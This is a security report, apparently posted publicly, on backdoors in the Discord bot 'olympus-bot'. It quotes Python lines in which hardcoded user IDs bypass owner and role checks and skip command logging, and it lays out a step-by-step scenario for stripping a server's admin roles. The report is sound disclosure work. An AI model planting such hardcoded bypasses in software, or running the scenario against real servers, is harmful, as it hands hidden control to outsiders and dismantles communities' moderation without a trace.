# Security Breach Report — `sonujana26/olympus-bot`

> All line numbers and links verified against commit [`e6454cb`](https://github.com/sonujana26/olympus-bot/commit/e6454cbd129fb9ad5202da6655a7ee8341aa03a7)

---

## Hardcoded Bypass IDs Found

The following Discord user IDs are hardcoded directly into the bot's source code, granting them elevated privileges **in every server the bot operates in**, bypassing all normal Discord permission checks.

| ID | Found In |
|---|---|
| `213347081799073793` | `emergency.py`, `owner.py` |
| `677952614390038559` | `emergency.py`, `extraown.py`, `owner.py` |
| `1070619070468214824` | `main.py`, `extraown.py`, `nightmode.py` |
| `1087282349395411015` | `nightmode.py` |
| `858642338980954113` | `nightmode.py` |

---

## File-by-File Breakdown

---

### `main.py` — [Line 68](https://github.com/sonujana26/olympus-bot/blob/e6454cbd129fb9ad5202da6655a7ee8341aa03a7/main.py#L68)

```python
if context.author.id == 1070619070468214824:
    return
```

**What it does:**
Inside `on_command_completion`, if this user runs any command, the logging webhook is never called. Every command they execute is silently dropped from the audit trail.

**Potential impact:**
- The user can run any command in any server with **zero logging**
- Server owners and admins reviewing command logs will never see their activity
- Enables covert abuse of all other bypasses without any evidence

---

### `cogs/commands/emergency.py` — Lines [106](https://github.com/sonujana26/olympus-bot/blob/e6454cbd129fb9ad5202da6655a7ee8341aa03a7/cogs/commands/emergency.py#L106), [150](https://github.com/sonujana26/olympus-bot/blob/e6454cbd129fb9ad5202da6655a7ee8341aa03a7/cogs/commands/emergency.py#L150), [361](https://github.com/sonujana26/olympus-bot/blob/e6454cbd129fb9ad5202da6655a7ee8341aa03a7/cogs/commands/emergency.py#L361), [498](https://github.com/sonujana26/olympus-bot/blob/e6454cbd129fb9ad5202da6655a7ee8341aa03a7/cogs/commands/emergency.py#L498)

```python
# Line 106 (emergency enable)
Olympus = ['213347081799073793', '677952614390038559']
if ctx.author.id != ctx.guild.owner_id and str(ctx.author.id) not in Olympus:

# Line 150 (emergency disable)
Olympus = ['213347081799073793', '677952614390038559']
if ctx.author.id != ctx.guild.owner_id and str(ctx.author.id) not in Olympus:

# Line 361 (emergencysituation / emgs)
Olympus = ['213347081799073793', '677952614390038559']
if not await self.is_guild_owner_or_authorised(ctx) and str(ctx.author.id) not in Olympus:

# Line 498 (emgrestore)
Olympus = ['213347081799073793', '677952614390038559']
if ctx.author.id != ctx.guild.owner_id and str(ctx.author.id) not in Olympus:
```

**What it does:**
The `emergency` command group is designed to protect servers by stripping dangerous permissions from roles during an attack. The Olympus users bypass the server owner check on every subcommand:

- `emergency enable` — Scans ALL roles in the server and adds those with dangerous permissions (Administrator, Ban, Kick, Manage Roles, Manage Channels, Manage Guild) to an emergency watchlist.
- `emergency disable` — Clears the entire emergency watchlist.
- `emergencysituation` / `emgs` — **Executes the attack**: strips all dangerous permissions from every listed role simultaneously, repositions the most-membered role, and **temporarily disables the server's antinuke** while doing so.
- `emgrestore` — Restores permissions after the emergency. The bypass user can also choose **not** to restore them.

**Potential impact:**
- Can be run in **any server** the bot is in, at any time, without being the server owner
- Effectively nukes every powerful role in a server (admins, mods, etc.) in one command
- Disables antinuke protection during execution, leaving the server completely exposed
- Combined with the logging bypass, leaves no trace of who triggered it

---

### `cogs/commands/extraown.py` — [Line 39](https://github.com/sonujana26/olympus-bot/blob/e6454cbd129fb9ad5202da6655a7ee8341aa03a7/cogs/commands/extraown.py#L39)

```python
Olympus = ['1070619070468214824', '677952614390038559']
if ctx.author.id != ctx.guild.owner_id and str(ctx.author.id) not in Olympus:
```

**What it does:**
Bypasses the server owner check on the `extraowner` command. The Extra Owner role grants control over antinuke settings and whitelist management — it is the second-highest authority in the bot's permission model.

**Potential impact:**
- Can **assign any user as Extra Owner** of any server the bot is in
- Extra Owners can modify antinuke configs and whitelists, effectively disabling server protections
- Can also reset or remove the current Extra Owner, causing disruption
- No Discord role or permission required to do this

---

### `cogs/commands/nightmode.py` — Lines [17](https://github.com/sonujana26/olympus-bot/blob/e6454cbd129fb9ad5202da6655a7ee8341aa03a7/cogs/commands/nightmode.py#L17), [74](https://github.com/sonujana26/olympus-bot/blob/e6454cbd129fb9ad5202da6655a7ee8341aa03a7/cogs/commands/nightmode.py#L74), [82](https://github.com/sonujana26/olympus-bot/blob/e6454cbd129fb9ad5202da6655a7ee8341aa03a7/cogs/commands/nightmode.py#L82), [144](https://github.com/sonujana26/olympus-bot/blob/e6454cbd129fb9ad5202da6655a7ee8341aa03a7/cogs/commands/nightmode.py#L144), [152](https://github.com/sonujana26/olympus-bot/blob/e6454cbd129fb9ad5202da6655a7ee8341aa03a7/cogs/commands/nightmode.py#L152)

```python
# Line 17
self.ricky = ['1070619070468214824', '1087282349395411015', '858642338980954113']

# Lines 74, 144 (enable & disable owner check)
if not own and not check and ctx.author.id not in self.ricky:

# Lines 82, 152 (role position check)
) and ctx.author.id not in self.ricky:
```

**What it does:**
Nightmode strips Administrator permissions from all manageable roles in a server (similar to emergency mode). The `ricky` list bypasses **two checks**:
1. The server owner / extra owner check
2. The role hierarchy check (normally the user must have a higher role than the bot's top role)

**Potential impact:**
- 3 different user IDs can enable/disable nightmode in **any server** the bot is in
- Strips Administrator permission from every role below the bot's top role
- Can be used offensively to silently nerf an entire server's admin structure
- Can be "disabled" to restore permissions, or left enabled to keep admins locked out
- Role position check bypass means even a regular member with no roles can do this

---

### `cogs/commands/owner.py` — [Line 149](https://github.com/sonujana26/olympus-bot/blob/e6454cbd129fb9ad5202da6655a7ee8341aa03a7/cogs/commands/owner.py#L149)

```python
self.bot_owner_ids = [213347081799073793, 677952614390038559]
```

**What it does:**
Only users in `bot_owner_ids` can stop an active "server tour" — a bot feature that continuously moves a target member between voice channels for a set duration.

**Potential impact:**
- Lower severity than other bypasses
- Allows these users to stop a tour running in any server
- However, combined with the `main.py` logging bypass, they can start/stop tours invisibly

---

## Attack Scenario (Worst Case)

A user with ID `1070619070468214824` joins **any server** that has this bot:

1. Runs `emergency enable` — silently adds every dangerous role to the emergency list
2. Runs `emergencysituation` — strips admin/ban/kick/manage perms from every role, disables antinuke
3. Runs `extraowner set @attacker` — grants themselves or an ally full Extra Owner control
4. Runs `nightmode enable` — additionally strips Administrator from all remaining roles
5. Walks away — the server's entire moderation structure is dismantled

**None of this is logged** ([main.py line 68](https://github.com/sonujana26/olympus-bot/blob/e6454cbd129fb9ad5202da6655a7ee8341aa03a7/main.py#L68)). The server owner sees no audit trail from the bot. The only evidence would be Discord's own audit log showing the bot made the role changes.

---

## Summary Table

| File | Line(s) | IDs Involved | Severity | Link |
|---|---|---|---|---|
| `main.py` | 68 | `1070619070468214824` | Critical | [→](https://github.com/sonujana26/olympus-bot/blob/e6454cbd129fb9ad5202da6655a7ee8341aa03a7/main.py#L68) |
| `cogs/commands/emergency.py` | 106, 147, 355, 491 | `213347081799073793`, `677952614390038559` | Critical | [→](https://github.com/sonujana26/olympus-bot/blob/e6454cbd129fb9ad5202da6655a7ee8341aa03a7/cogs/commands/emergency.py#L106) |
| `cogs/commands/extraown.py` | 39 | `1070619070468214824`, `677952614390038559` | High | [→](https://github.com/sonujana26/olympus-bot/blob/e6454cbd129fb9ad5202da6655a7ee8341aa03a7/cogs/commands/extraown.py#L39) |
| `cogs/commands/nightmode.py` | 17, 74, 82, 144, 152 | `1070619070468214824`, `1087282349395411015`, `858642338980954113` | High | [→](https://github.com/sonujana26/olympus-bot/blob/e6454cbd129fb9ad5202da6655a7ee8341aa03a7/cogs/commands/nightmode.py#L17) |
| `cogs/commands/owner.py` | 149 | `213347081799073793`, `677952614390038559` | Low | [→](https://github.com/sonujana26/olympus-bot/blob/e6454cbd129fb9ad5202da6655a7ee8341aa03a7/cogs/commands/owner.py#L149) |
